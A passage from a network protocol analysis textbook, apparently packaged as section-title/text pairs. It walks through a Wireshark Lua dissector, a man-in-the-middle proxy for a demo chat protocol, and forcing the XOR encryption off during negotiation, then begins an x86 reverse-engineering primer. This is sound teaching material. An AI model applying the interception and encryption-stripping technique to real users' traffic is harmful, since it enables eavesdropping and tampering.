for\nUDP protocols than it is for TCP, because each captured UDP packet typi-\ncally has everything needed by the dissector. With TCP, you’ll need to deal\nwith such problems as data that spans multiple packets (which is exactly\nwhy we needed to account for length block in our work on SuperFunkyChat\nusing the Python script in Listing 5-9). Because UDP is easier to work with,\nwe’ll focus on developing UDP dissectors.\nConveniently enough, SuperFunkyChat supports a UDP mode by passing\nthe --udp command line parameter to the client when starting. Send this\nflag while capturing, and you should see packets similar to those shown in\nFigure 5-11. (Notice that Wireshark mistakenly tries to dissect the traffic\nas an unrelated GVSP protocol, as displayed in the Protocol column .\nImplementing our own dissector will fix the mistaken protocol choice.)\n\nFigure 5-11: Wireshark showing captured UDP traffic\nOne way to load Lua files is to put your scripts in the %APPDATA%\\\nWireshark\\plugins directory on Windows and in the ~/.config/wireshark/plugins\ndirectory on Linux and macOS. You can also load a Lua script by specifying\nit on the command line as follows, replacing the path information with the\nlocation of your script:\nwireshark -X lua_script:</path/to/script.lua>\nIf there’s an error in your script’s syntax, you should see a message dialog\nsimilar to Figure 5-12. (Granted, this isn’t exactly the most efficient way to\ndevelop, but it’s fine as long as you’re just prototyping.)\nAnalysis from the Wire 97"
  },
  {
    "input": "Creating the Dissector",
    "output": "Figure 5-12: The Wireshark Lua error dialog\nCreating the Dissector\nTo create a protocol dissector for the SuperFunkyChat protocol, first create\nthe basic shell of the dissector and register it in Wireshark’s list of dissectors\nfor UDP port 12345. Copy Listing 5-15 into a file called dissector.lua and load it\ninto Wireshark along with an appropriate packet capture of the UDP traffic.\nIt should run without errors.\ndissector.lua -- Declare our chat protocol for dissection\n chat_proto = Proto(\"chat\",\"SuperFunkyChat Protocol\")\n-- Specify protocol fields\n chat_proto.fields.chksum = ProtoField.uint32(\"chat.chksum\", \"Checksum\",\nbase.HEX)\nchat_proto.fields.command = ProtoField.uint8(\"chat.command\", \"Command\")\nchat_proto.fields.data = ProtoField.bytes(\"chat.data\", \"Data\")\n-- Dissector function\n-- buffer: The UDP packet data as a \"Testy Virtual Buffer\"\n-- pinfo: Packet information\n-- tree: Root of the UI tree\n function chat_proto.dissector(buffer, pinfo, tree)\n-- Set the name in the protocol column in the UI\nx pinfo.cols.protocol = \"CHAT\"\n-- Create sub tree which represents the entire buffer.\ny local subtree = tree:add(chat_proto, buffer(),\n\"SuperFunkyChat Protocol Data\")\nsubtree:add(chat_proto.fields.chksum, buffer(0, 4))\nsubtree:add(chat_proto.fields.command, buffer(4, 1))\nsubtree:add(chat_proto.fields.data, buffer(5))\nend\n-- Get UDP dissector table and add for port 12345\nz udp_table = DissectorTable.get(\"udp.port\")\nudp_table:add(12345, chat_proto)\nListing 5-15: A basic Lua Wireshark dissector\n98 Chapter 5"
  },
  {
    "input": "The Lua Dissection",
    "output": "When the script initially loads, it creates a new instance of the Proto\nclass , which represents an instance of a Wireshark protocol and assigns\nit the name chat_proto. Although you can build the dissected tree manually,\nI’ve chosen to define specific fields for the protocol at  so the fields will\nbe added to the display filter engine, and you’ll be able to set a display filter\nof chat.command == 0 so Wireshark will only show packets with command 0.\n(This technique is very useful for analysis because you can filter down to\nspecific packets easily and analyze them separately.)\nAt , the script creates a dissector() function on the instance of the\nProto class. This dissector() will be called to dissect a packet. The function\ntakes three parameters:\n• A buffer containing the packet data that is an instance of something\nWireshark calls a Testy Virtual Buffer (TVB).\n• A packet information instance that represents the display information\nfor the dissection.\n• The root tree object for the UI. You can attach subnodes to this tree to\ngenerate your display of the packet data.\nAt x, we set the name of the protocol in the UI column (as shown in\nFigure 5-11) to CHAT. Next, we build a tree of the protocol elements y we’re\ndissecting. Because UDP doesn’t have an explicit length field, we don’t need\nto take that into account; we only need to extract the checksum field. We\nadd to the subtree using the protocol fields and use the buffer parameter\nto create a range, which takes a start index into the buffer and an optional\nlength. If no length is specified, the rest of the buffer is used.\nThen we register the protocol dissector with Wireshark’s UDP dissector\ntable. (Notice that the function we defined at  hasn’t actually executed\nyet; we’ve simply defined it.) Finally, we get the UDP table and add our\nchat_proto object to the table with port 12345 z. Now we’re ready to start\nthe dissection.\nThe Lua Dissection\nStart Wireshark using the script in Listing 5-15 (for example, using the –X\nparameter) and then load a packet capture of the UDP traffic. You should\nsee that the dissector has loaded and dissected the packets, as shown in\nFigure 5-13.\nAt , the Protocol column has changed to CHAT. This matches the first\nline of our dissector function in Listing 5-15 and makes it easier to see that\nwe’re dealing with the correct protocol. At , the resulting tree shows the\ndifferent fields of the protocol with the checksum printed in hex, as we\nspecified. If you click the Data field in the tree, the corresponding range\nof bytes should be highlighted in the raw packet display at the bottom of\nthe window .\nAnalysis from the Wire 99"
  },
  {
    "input": "Parsing a Message Packet",
    "output": "\n\n\nFigure 5-13: Dissected SuperFunkyChat protocol traffic\nParsing a Message Packet\nLet’s augment the dissector to parse a particular packet. We’ll use com-\nmand 3 as our example because we’ve determined that it marks the send-\ning or receiving of a message. Because a received message should show the\nID of the sender as well as the message text, this packet data should con-\ntain both components; this makes it a perfect example for our purposes.\nListing 5-16 shows a snippet from Listing 5-10 when we dumped the\ntraffic using our Python script.\nb'\\x03bob\\x0cHow are you?'\nb\"\\x03bob\\x16This is nice isn't it?\"\nListing 5-16: Example message data\nListing 5-16 shows two examples of message packet data in a binary\nPython string format. The \\xXX characters are actually nonprintable bytes,\nso \\x05 is really the byte 0x05 and \\x16 is 0x16 (or 22 in decimal). Two print-\nable strings are in each packet shown in the listing: the first is a username\n(in this case bob), and the second is the message. Each string is prefixed by\na nonprintable character. Very simple analysis (counting characters, in this\ncase) indicates that the nonprintable character is the length of the string\nthat follows the character. For example, with the username string, the non-\nprintable character represents 0x03, and the string bob is three characters\nin length.\n100 Chapter 5\nLet’s write a function to parse a single string from its binary representa-\ntion. We’ll update Listing 5-15 to add support for parsing the message com-\nmand in Listing 5-17.\ndissector_with -- Declare our chat protocol for dissection\n_commands.lua chat_proto = Proto(\"chat\",\"SuperFunkyChat Protocol\")\n-- Specify protocol fields\nchat_proto.fields.chksum = ProtoField.uint32(\"chat.chksum\", \"Checksum\",\nbase.HEX)\nchat_proto.fields.command = ProtoField.uint8(\"chat.command\", \"Command\")\nchat_proto.fields.data = ProtoField.bytes(\"chat.data\", \"Data\")\n-- buffer: A TVB containing packet data\n-- start: The offset in the TVB to read the string from\n-- returns The string and the total length used\n function read_string(buffer, start)\nlocal len = buffer(start, 1):uint()\nlocal str = buffer(start + 1, len):string()\nreturn str, (1 + len)\nend\n-- Dissector function\n-- buffer: The UDP packet data as a \"Testy Virtual Buffer\"\n-- pinfo: Packet information\n-- tree: Root of the UI tree\nfunction chat_proto.dissector(buffer, pinfo, tree)\n-- Set the name in the protocol column in the UI\npinfo.cols.protocol = \"CHAT\"\n-- Create sub tree which represents the entire buffer.\nlocal subtree = tree:add(chat_proto,\nbuffer(),\n\"SuperFunkyChat Protocol Data\")\nsubtree:add(chat_proto.fields.chksum, buffer(0, 4))\nsubtree:add(chat_proto.fields.command, buffer(4, 1))\n-- Get a TVB for the data component of the packet.\n local data = buffer(5):tvb()\nlocal datatree = subtree:add(chat_proto.fields.data, data())\nlocal MESSAGE_CMD = 3\n local command = buffer(4, 1):uint()\nif command == MESSAGE_CMD then\nlocal curr_ofs = 0\nlocal str, len = read_string(data, curr_ofs)\nx datatree:add(chat_proto, data(curr_ofs, len), \"Username: \" .. str)\ncurr_ofs = curr_ofs + len\nstr, len = read_string(data, curr_ofs)\ndatatree:add(chat_proto, data(curr_ofs, len), \"Message: \" .. str)\nend\nend\nAnalysis from the Wire 101\n-- Get UDP dissector table and add for port 12345\nudp_table = DissectorTable.get(\"udp.port\")\nudp_table:add(12345, chat_proto)\nListing 5-17: The updated dissector script used to parse the Message command\nIn Listing 5-17, the added read_string() function  takes a TVB object\n(buffer) and a starting offset (start), and it returns the length of the buffer\nand then the string.\nNOTE What if the string is longer than the range of a byte value? Ah, that’s one of the chal-\nlenges of protocol analysis. Just because something looks simple doesn’t mean it actu-\nally is simple. We’ll ignore issues such as the length because this is only meant as an\nexample, and ignoring length works for any examples we’ve captured.\nWith a function to parse the binary strings, we can now add the Message\ncommand to the dissection tree. The code begins by adding the original\ndata tree and creates a new TVB object  that only contains the packet’s\ndata. It then extracts the command field as an integer and checks whether\nit’s our Message command . If it’s not, we leave the existing data tree, but if\nthe field matches, we proceed to parse the two strings and add them to the\ndata subtree x. However, instead of defining specific fields, we can add text\nnodes by specifying only the proto object rather than a field object. If you\nnow reload this file into Wireshark, you should see that the username and\nmessage strings are parsed, as shown in Figure 5-14.\n\n\nFigure 5-14: A parsed Message command\n102 Chapter 5"
  },
  {
    "input": "Setting Up the Proxy",
    "output": "Because the parsed data ends up as filterable values, we can select a\nMessage command by specifying chat.command == 3 as a display filter, as shown\nat  in Figure 5-14. We can see that the username and message strings have\nbeen parsed correctly in the tree, as shown at .\nThat concludes our quick introduction to writing a Lua dissector\nfor Wireshark. Obviously, there is still plenty you can do with this script,\nincluding adding support for more commands, but you have enough for\nprototyping.\nNOTE Be sure to visit the Wireshark website for more on how to write parsers, including how\nto implement a TCP stream parser.\nusing a proxy to actively analyze traffic\nUsing a tool such as Wireshark to passively capture network traffic for later\nanalysis of network protocols has a number of advantages over active cap-\nture (as discussed in Chapter 2). Passive capture doesn’t affect the network\noperation of the applications you’re trying to analyze and requires no modi-\nfications of the applications. On the other hand, passive capture doesn’t\nallow you to interact easily with live traffic, which means you can’t modify\ntraffic easily on the fly to see how applications will respond.\nIn contrast, active capture allows you to manipulate live traffic but\nrequires more setup than passive capture. It may require you to modify\napplications, or at the very least to redirect application traffic through a\nproxy. Your choice of approach will depend on your specific scenario, and\nyou can certainly combine passive and active capture.\nIn Chapter 2, I included some example scripts to demonstrate captur-\ning traffic. You can combine these scripts with the Canape Core libraries to\ngenerate a number of proxies, which you might want to use instead of pas-\nsive capture.\nNow that you have a better understanding of passive capture, I’ll\nspend the rest of this chapter describing techniques for implementing\na proxy for the SuperFunkyChat protocol and focus on how best to use\nactive network capture.\nSetting Up the Proxy\nTo set up the proxy, we’ll begin by modifying one of the capture examples\nin Chapter 2, specifically Listing 2-4, so we can use it for active network pro-\ntocol analysis. To simplify the development process and configuration of the\nSuperFunkyChat application, we’ll use a port-forwarding proxy rather than\nsomething like SOCKS.\nCopy Listing 5-18 into the file chapter5_proxy.csx and run it using\nCanape Core by passing the script’s filename to the CANAPE.Cli\nexecutable.\nAnalysis from the Wire 103\nchapter5 using static System.Console;\n_proxy.csx using static CANAPE.Cli.ConsoleUtils;\nvar template = new FixedProxyTemplate();\n// Local port of 4444, destination 127.0.0.1:12345\n template.LocalPort = 4444;\ntemplate.Host = \"127.0.0.1\";\ntemplate.Port = 12345;\nvar service = template.Create();\n// Add an event handler to log a packet. Just print to console.\n service.LogPacketEvent += (s,e) => WritePacket(e.Packet);\n// Print to console when a connection is created or closed.\n service.NewConnectionEvent += (s,e) =>\nWriteLine(\"New Connection: {0}\", e.Description);\nservice.CloseConnectionEvent += (s,e) =>\nWriteLine(\"Closed Connection: {0}\", e.Description);\nservice.Start();\nWriteLine(\"Created {0}\", service);\nWriteLine(\"Press Enter to exit...\");\nReadLine();\nservice.Stop();\nListing 5-18: The active analysis proxy\nAt , we tell the proxy to listen locally on port 4444 and make a proxy\nconnection to 127.0.0.1 port 12345. This should be fine for testing the chat\napplication, but if you want to reuse the script for another application pro-\ntocol, you’ll need to change the port and IP address as appropriate.\nAt , we make one of the major changes to the script in Chapter 2: we\nadd an event handler that is called whenever a packet needs to be logged,\nwhich allows us to print the packet as soon it arrives. At , we add some\nevent handlers to print when a new connection is created and then closed.\nNext, we reconfigure the ChatClient application to communicate with\nlocal port 4444 instead of the original port 12345. In the case of ChatClient,\nwe simply add the --port NUM parameter to the command line as shown here:\nChatClient.exe --port 4444 user1 127.0.0.1\nNOTE Changing the destination in real-world applications may not be so simple. Review\nChapters 2 and 4 for ideas on how to redirect an arbitrary application into your proxy.\nThe client should successfully connect to the server via the proxy, and the\nproxy’s console should begin displaying packets, as shown in Listing 5-19.\nCANAPE.Cli (c) 2017 James Forshaw, 2014 Context Information Security.\nCreated Listener (TCP 127.0.0.1:4444), Server (Fixed Proxy Server)\nPress Enter to exit...\n104 Chapter 5"
  },
  {
    "input": "Protocol Analysis Using a Proxy",
    "output": " New Connection: 127.0.0.1:50844 <=> 127.0.0.1:12345\nTag 'Out' – Network '127.0.0.1:50844 <=> 127.0.0.1:12345'\n: 00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F - 0123456789ABCDEF\n--------:-------------------------------------------------------------------\n00000000: 42 49 4E 58 00 00 00 0E 00 00 04 16 00 05 75 73 - BINX..........us\n00000010: 65 72 31 05 62 6F 72 61 78 00 - er1.borax.\nTag 'In'x - Network '127.0.0.1:50844 <=> 127.0.0.1:12345'\n: 00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F - 0123456789ABCDEF\n--------:-------------------------------------------------------------------\n00000000: 00 00 00 02 00 00 00 01 01 00 - ..........\nPM - Tag 'Out' - Network '127.0.0.1:50844 <=> 127.0.0.1:12345'\n: 00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F - 0123456789ABCDEF\n--------:-------------------------------------------------------------------\ny 00000000: 00 00 00 0D - ....\nTag 'Out' - Network '127.0.0.1:50844 <=> 127.0.0.1:12345'\n: 00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F - 0123456789ABCDEF\n--------:-------------------------------------------------------------------\n00000000: 00 00 04 11 03 05 75 73 65 72 31 05 68 65 6C 6C - ......user1.hell\n00000010: 6F - o\n--snip--\nz Closed Connection: 127.0.0.1:50844 <=> 127.0.0.1:12345\nListing 5-19: Example output from proxy when a client connects\nOutput indicating that a new proxy connection has been made is shown\nat . Each packet is displayed with a header containing information about its\ndirection (outbound or inbound), using the descriptive tags Out  and In x.\nIf your terminal supports 24-bit color, as do most Linux, macOS, and\neven Windows 10 terminals, you can enable color support in Canape Core\nusing the --color parameter when starting a proxy script. The colors assigned\nto inbound packets are similar to those in Wireshark: pink for outbound and\nblue for inbound. The packet display also shows which proxy connection it\ncame from , matching up with the output at . Multiple connections could\noccur at the same time, especially if you’re proxying a complex application.\nEach packet is dumped in hex and ASCII format. As with capture in\nWireshark, the traffic might be split between packets as in y. However,\nunlike with Wireshark, when using a proxy, we don’t need to deal with\nnetwork effects such as retransmitted packets or fragmentation: we simply\naccess the raw TCP stream data after the operating system has dealt with\nall the network effects for us.\nAt z, the proxy prints that the connection is closed.\nProtocol Analysis Using a Proxy\nWith our proxy set up, we can begin the basic analysis of the protocol. The\npackets shown in Listing 5-19 are simply the raw data, but we should ideally\nwrite code to parse the traffic as we did with the Python script we wrote for\nAnalysis from the Wire 105\nWireshark. To that end, we’ll write a Data Parser class containing functions\nto read and write data to and from the network. Copy Listing 5-20 into a\nnew file in the same directory as you copied chapter5_proxy.csx in Listing 5-18\nand call it parser.csx.\nparser.csx using CANAPE.Net.Layers;\nusing System.IO;\nclass Parser : DataParserNetworkLayer\n{\n protected override bool NegotiateProtocol(\nStream serverStream, Stream clientStream)\n{\n var client = new DataReader(clientStream);\nvar server = new DataWriter(serverStream);\n// Read magic from client and write it to server.\n uint magic = client.ReadUInt32();\nConsole.WriteLine(\"Magic: {0:X}\", magic);\nserver.WriteUInt32(magic);\n// Return true to signal negotiation was successful.\nreturn true;\n}\n}\nListing 5-20: A basic parser code for proxy\nThe negotiation method  is called before any other communication\ntakes place and is passed to two C# stream objects: one connected to the\nChat Server and the other to the Chat Client. We can use this negotiation\nmethod to handle the magic value the protocol uses, but we could also\nuse it for more complex tasks, such as enabling encryption if the protocol\nsupports it.\nThe first task for the negotiation method is to read the magic value\nfrom the client and pass it to the server. To simply read and write the 4-byte\nmagic value, we first wrap the streams in DataReader and DataWriter classes .\nWe then read the magic value from the client, print it to the console, and\nwrite it to the server .\nAdd the line #load \"parser.csx\" to the very top of chapter5_proxy.csx.\nNow when the main chapter5_proxy.csx script is parsed, the parser.csx file is\nautomatically included and parsed with the main script. Using this loading\nfeature allows you to write each component of your parser in a separate file\nto make the task of writing a complex proxy manageable. Then add the line\ntemplate.AddLayer<Parser>(); just after template.Port = 12345; to add the parsing\nlayer to every new connection. This addition will instantiate a new instance\nof the Parser class in Listing 5-20 with every connection so you can store any\nstate you need as members of the class. If you start the proxy script and con-\nnect a client through the proxy, only important protocol data is logged; you’ll\nno longer see the magic value (other than in the console output).\n106 Chapter 5"
  },
  {
    "input": "Adding Basic Protocol Parsing",
    "output": "Adding Basic Protocol Parsing\nNow we’ll reframe the network protocol to ensure that each packet contains\nonly the data for a single packet. We’ll do this by adding functions to read\nthe length and checksum fields from the network and leave only the data.\nAt the same time, we’ll rewrite the length and checksum when sending the\ndata to the original recipient to keep the connection open.\nBy implementing this basic parsing and proxying of a client connection,\nall nonessential information, such as lengths and checksums, should be\nremoved from the data. As an added bonus, if you modify data inside the\nproxy, the sent packet will have the correct checksum and length to match\nyour modifications. Add Listing 5-21 to the Parser class to implement these\nchanges and restart the proxy.\n int CalcChecksum(byte[] data) {\nint chksum = 0;\nforeach(byte b in data) {\nchksum += b;\n}\nreturn chksum;\n}\n DataFrame ReadData(DataReader reader) {\nint length = reader.ReadInt32();\nint chksum = reader.ReadInt32();\nreturn reader.ReadBytes(length).ToDataFrame();\n}\n void WriteData(DataFrame frame, DataWriter writer) {\nbyte[] data = frame.ToArray();\nwriter.WriteInt32(data.Length);\nwriter.WriteInt32(CalcChecksum(data));\nwriter.WriteBytes(data);\n}\nx protected override DataFrame ReadInbound(DataReader reader) {\nreturn ReadData(reader);\n}\nprotected override void WriteOutbound(DataFrame frame, DataWriter writer) {\nWriteData(frame, writer);\n}\nprotected override DataFrame ReadOutbound(DataReader reader) {\nreturn ReadData(reader);\n}\nprotected override void WriteInbound(DataFrame frame, DataWriter writer) {\nWriteData(frame, writer);\n}\nListing 5-21: Parser code for SuperFunkyChat protocol\nAnalysis from the Wire 107"
  },
  {
    "input": "Changing Protocol Behavior",
    "output": "Although the code is a bit verbose (blame C# for that), it should be\nfairly simple to understand. At , we implement the checksum calculator.\nWe could check packets we read to verify their checksums, but we’ll only\nuse this calculator to recalculate the checksum when sending the packet\nonward.\nThe ReadData() function at  reads a packet from the network connec-\ntion. It first reads a big endian 32-bit integer, which is the length, then the\n32-bit checksum, and finally the data as bytes before calling a function to\nconvert that byte array to a DataFrame. (A DataFrame is an object to contain\nnetwork packets; you can convert a byte array or a string to a frame depend-\ning on what you need.)\nThe WriteData() function at  does the reverse of ReadData(). It uses the\nToArray() method on the incoming DataFrame to convert the packet to bytes\nfor writing. Once we have the byte array, we can recalculate the checksum\nand the length, and then write it all back to the DataWriter class. At x, we\nimplement the various functions to read and write data from the inbound\nand outbound streams.\nPut together all the different scripts for network proxy and parsing and\nstart a client connection through the proxy, and all nonessential informa-\ntion, such as lengths and checksums, should be removed from the data. As\nan added bonus, if you modify data inside the proxy, the sent packet will\nhave the correct checksum and length to match your modifications.\nChanging Protocol Behavior\nProtocols often include a number of optional components, such as encryp-\ntion or compression. Unfortunately, it’s not easy to determine how that\nencryption or compression is implemented without doing a lot of reverse\nengineering. For basic analysis, it would be nice to be able to simply remove\nthe component. Also, if the encryption or compression is optional, the pro-\ntocol will almost certainly indicate support for it while negotiating the ini-\ntial connection. So, if we can modify the traffic, we might be able to change\nthat support setting and disable that additional feature. Although this is a\ntrivial example, it demonstrates the power of using a proxy instead of pas-\nsive analysis with a tool like Wireshark. We can modify the connection to\nmake analysis easier.\nFor example, consider the chat application. One of its optional features\nis XOR encryption (although see Chapter 7 on why it’s not really encryp-\ntion). To enable this feature, you would pass the --xor parameter to the\nclient. Listing 5-22 compares the first couple of packets for the connection\nwithout the XOR parameter and then with the XOR parameter.\nOUTBOUND XOR : 00 05 75 73 65 72 32 04 4F 4E 59 58 01 - ..user2.ONYX.\nOUTBOUND NO XOR: 00 05 75 73 65 72 32 04 4F 4E 59 58 00 - ..user2.ONYX.\nINBOUND XOR : 01 E7 - ..\nINBOUND NO XOR: 01 00 - ..\nListing 5-22: Example packets with and without XOR encryption enabled\n108 Chapter 5\nI’ve highlighted in bold two differences in Listing 5-22. Let’s draw\nsome conclusions from this example. In the outbound packet (which is\ncommand 0 based on the first byte), the final byte is a 1 when XOR is\nenabled but 0x00 when it’s not enabled. My guess would be that this flag\nindicates that the client supports XOR encryption. For inbound traffic,\nthe final byte of the first packet (command 1 in this case) is 0xE7 when\nXOR is enabled and 0x00 when it’s not. My guess would be that this is a\nkey for the XOR encryption.\nIn fact, if you look at the client console when you’re enabling XOR\nencryption, you’ll see the line ReKeying connection to key 0xE7, which indi-\ncates it is indeed the key. Although the negotiation is valid traffic, if you\nnow try to send a message with the client through the proxy, the connection\nwill no longer work and may even be disconnected. The connection stops\nworking because the proxy will try to parse fields, such as the length of the\npacket, from the connection but will get invalid values. For example, when\nreading a length, such as 0x10, the proxy will instead read 0x10 XOR 0xE7,\nwhich is 0xF7. Because there are no 0xF7 bytes on the network connection,\nit will hang. The short explanation is that to continue the analysis in this\nsituation, we need to do something about the XOR.\nWhile implementing the code to de-XOR the traffic when we read it\nand re-XOR it again when we write it wouldn’t be especially difficult, it\nmight not be so simple to do if this feature were implemented to support\nsome proprietary compression scheme. Therefore, we’ll simply disable XOR\nencryption in our proxy irrespective of the client’s setting. To do so, we read\nthe first packet in the connection and ensure that the final byte is set to 0.\nWhen we forward that packet onward, the server will not enable XOR and\nwill return the value of 0 as the key. Because 0 is a NO-OP in XOR encryp-\ntion (as in A XOR 0 = A), this technique will effectively disable the XOR.\nChange the ReadOutbound() method in the parser to the code in\nListing 5-23 to disable the XOR encryption.\nprotected override DataFrame ReadOutbound(DataReader reader) {\nDataFrame frame = ReadData(reader);\n// Convert frame back to bytes.\nbyte[] data = frame.ToArray();\nif (data[0] == 0) {\nConsole.WriteLine(\"Disabling XOR Encryption\");\ndata[data.Length - 1] = 0;\nframe = data.ToDataFrame();\n}\nreturn frame;\n}\nListing 5-23: Disable XOR encryption\nIf you now create a connection through the proxy, you’ll find that\nregardless of whether the XOR setting is enabled or not, the client will\nnot be able to enable XOR.\nAnalysis from the Wire 109"
  },
  {
    "input": "Final Words",
    "output": "Final words\nIn this chapter, you learned how to perform basic protocol analysis on an\nunknown protocol using passive and active capture techniques. We started\nby doing basic protocol analysis using Wireshark to capture example traffic.\nThen, through manual inspection and a simple Python script, we were able\nto understand some parts of an example chat protocol.\nWe discovered in the initial analysis that we were able to implement a\nbasic Lua dissector for Wireshark to extract protocol information and dis-\nplay it directly in the Wireshark GUI. Using Lua is ideal for prototyping pro-\ntocol analysis tools in Wireshark.\nFinally, we implemented a man-in-the-middle proxy to analyze the pro-\ntocol. Proxying the traffic allows demonstration of a few new analysis tech-\nniques, such as modifying protocol traffic to disable protocol features (such\nas encryption) that might hinder the analysis of the protocol using purely\npassive techniques.\nThe technique you choose will depend on many factors, such as the dif-\nficulty of capturing the network traffic and the complexity of the protocol.\nYou’ll want to apply the most appropriate combination of techniques to\nfully analyze an unknown protocol.\n110 Chapter 5"
  },
  {
    "input": "Chapter 6: Application Reverse Engineering\r",
    "output": "6\nAPPLICATION R E vERSE\nENGINEERING\nIf you can analyze an entire network protocol just by\nlooking at the transmitted data, then your analysis is\nquite simple. But that’s not always possible with some\nprotocols, especially those that use custom encryption\nor compression schemes. However, if you can get the\nexecutables for the client or server, you can use binary\nreverse engineering (RE) to determine how the protocol\noperates and search for vulnerabilities as well.\nThe two main kinds of reverse engineering are static and dynamic. Static\nreverse engineering is the process of disassembling a compiled executable\ninto native machine code and using that code to understand how the execut-\nable works. Dynamic reverse engineering involves executing an application\nand then using tools, such as debuggers and function monitors, to inspect\nthe application’s runtime operation."
  },
  {
    "input": "Interpreted Languages",
    "output": "In this chapter, I’ll walk you through the basics of taking apart execut-\nables to identify and understand the code areas responsible for network\ncommunication.\nI’ll focus on the Windows platform first, because you’re more likely to\nfind applications without source code on Windows than you are on Linux\nor macOS. Then, I’ll cover the differences between platforms in more detail\nand give you some tips and tricks for working on alternative platforms; how-\never, most of the skills you’ll learn will be applicable on all platforms. As\nyou read, keep in mind that it takes time to become good reverse engineer,\nand I can’t possibly cover the broad topic of reverse engineering in one\nchapter.\nBefore we delve into reverse engineering, I’ll discuss how developers\ncreate executable files and then provide some details about the omnipres-\nent x86 computer architecture. Once you understand the basics of x86\narchitecture and how it represents instructions, you’ll know what to look\nfor when you’re reverse engineering code.\nFinally, I’ll explain some general operating system principles, includ-\ning how the operating system implements networking functionality. Armed\nwith this knowledge, you should be able to track down and analyze network\napplications.\nLet’s start with background information on how programs execute on\na modern operating system and examine the principles of compilers and\ninterpreters.\ncompilers, interpreters, and assemblers\nMost applications are written in a higher-level programming language,\nsuch as C/C++, C#, Java, or one of the many scripting languages. When an\napplication is developed, the raw language is its source code. Unfortunately,\ncomputers don’t understand source code, so the high-level language must\nbe converted into machine code (the native instructions the computer’s pro-\ncessor executes) by interpreting or compiling the source code.\nThe two common ways of developing and executing programs is by\ninterpreting the original source code or by compiling a program to native\ncode. The way a program executes determines how we reverse engineer it,\nso let’s look at these two distinct methods of execution to get a better idea\nof how they work.\nInterpreted Languages\nInterpreted languages, such as Python and Ruby, are sometimes called\nscripting languages, because their applications are commonly run from\nshort scripts written as text files. Interpreted languages are dynamic and\nspeed up development time. But interpreters execute programs more\nslowly than code that has been converted to machine code, which the com-\nputer understands directly. To convert source code to a more native repre-\nsentation, the programming language can instead be compiled.\n112 Chapter 6"
  },
  {
    "input": "Static vs. Dynamic Linking",
    "output": "Compiled Languages\nCompiled programming languages use a compiler to parse the source code\nand generate machine code, typically by generating an intermediate lan-\nguage first. For native code generation, usually an assembly language specific\nto the CPU on which the application will run (such as 32- or 64-bit assem-\nbly) is used. The language is a human-readable and understandable form\nof the underlying processor’s instruction set. The assembly language is then\nconverted to machine code using an assembler. For example, Figure 6-1 shows\nhow a C compiler works.\nNative\nC source code machine code\n55\n#include <stdio.h>\n89 e5\n83 ec 10\nvoid main() {\nC compiler c7 04 24 64 50 40 00\nputs(\"Hello\\n\");\ne8 8e 1f 00 00\n}\nc9\nc3\npush ebp\nmov ebp,esp\nsub esp,0x10\nAssembly\nmov [esp],str Assembler\nsource code\ncall _puts\nleave\nret\nFigure 6-1: The C language compilation process\nTo reverse a native binary to the original source code, you need to\nreverse the compilation using a process called decompilation. Unfortunately,\ndecompiling machine code is quite difficult, so reverse engineers typically\nreverse just the assembly process using a process called disassembly.\nStatic vs. Dynamic Linking\nWith extremely simple programs, the compilation process might be all\nthat is needed to produce a working executable. But in most applications,\na lot of code is imported into the final executable from external libraries\nby linking—a process that uses a linker program after compilation. The\nlinker takes the application-specific machine code generated by the com-\npiler, along with any necessary external libraries used by the application,\nApplication Reverse Engineering 113"
  },
  {
    "input": "The Instruction Set Architecture ",
    "output": "and embeds everything in a final executable by statically linking any exter-\nnal libraries. This static linking process produces a single, self-contained\nexecutable that doesn’t depend on the original libraries.\nBecause certain processes might be handled in very different ways on\ndifferent operating systems, static linking all code into one big binary might\nnot be a good idea because the OS-specific implementation could change.\nFor example, writing to a file on disk might have widely different operating\nsystem calls on Windows than it does on Linux. Therefore, compilers com-\nmonly link an executable to operating system–specific libraries by dynamic\nlinking: instead of embedding the machine code in the final executable, the\ncompiler stores only a reference to the dynamic library and the required\nfunction. The operating system must resolve the linked references when the\napplication runs.\nthe x86 architecture\nBefore getting into the methods of reverse engineering, you’ll need some\nunderstanding of the basics of the x86 computer architecture. For a com-\nputer architecture that is over 30 years old, x86 is surprisingly persistent.\nIt’s used in the majority of desktop and laptop computers available today.\nAlthough the PC has been the traditional home of the x86 architec-\nture, it has found its way into Mac1 computers, game consoles, and even\nsmartphones.\nThe original x86 architecture was released by Intel in 1978 with the\n8086 CPU. Over the years, Intel and other manufacturers (such as AMD)\nhave improved its performance massively, moving from supporting 16-bit\noperations to 32-bit and now 64-bit operations. The modern architecture\nhas barely anything in common with the original 8086, other than proces-\nsor instructions and programming idioms. Because of its lengthy history,\nthe x86 architecture is very complex. We’ll first look at how the x86 exe-\ncutes machine code, and then examine its CPU registers and the methods\nused to determine the order of execution.\nThe Instruction Set Architecture\nWhen discussing how a CPU executes machine code, it’s common to talk\nabout the instruction set architecture (ISA). The ISA defines how the machine\ncode works and how it interacts with the CPU and the rest of the computer.\nA working knowledge of the ISA is crucial for effective reverse engineering.\nThe ISA defines the set of machine language instructions available to a\nprogram; each individual machine language instruction is represented by a\nmnemonic instruction. The mnemonics name each instruction and determine\nhow its parameters, or operands, are represented. Table 6-1 lists the mne-\nmonics of some of the most common x86 instructions. (I’ll cover many of\nthese instructions in greater detail in the following sections.)\n1. Apple moved to the x86 architecture in 2006. Prior to that, Apple used the PowerPC archi-\ntecture. PCs, on the other hand, have always been based on x86 architecture.\n114 Chapter 6\nTable 6-1: Common x86 Instruction Mnemonics\nInstruction Description\nMOV destination, source Moves a value from source to destination\nADD destination, value Adds an integer value to the destination\nSUB destination, value Subtracts an integer value from a destination\nCALL address Calls the subroutine at the specified address\nJMP address Jumps unconditionally to the specified address\nRET Returns from a previous subroutine\nRETN size Returns from a previous subroutine and then increments\nthe stack by size\nJcc address Jumps to the specified address if the condition indicated\nby cc is true\nPUSH value Pushes a value onto the current stack and decrements\nthe stack pointer\nPOP destination Pops the top of the stack into the destination and incre-\nments the stack pointer\nCMP valuea, valueb Compares valuea and valueb and sets the appropriate\nflags\nTEST valuea, valueb Performs a bitwise AND on valuea and valueb and sets\nthe appropriate flags\nAND destination, value Performs a bitwise AND on the destination with the\nvalue\nOR destination, value Performs a bitwise OR on the destination with the\nvalue\nXOR destination, value Performs a bitwise Exclusive OR on the destination\nwith the value\nSHL destination, N Shifts the destination to the left by N bits (with left\nbeing higher 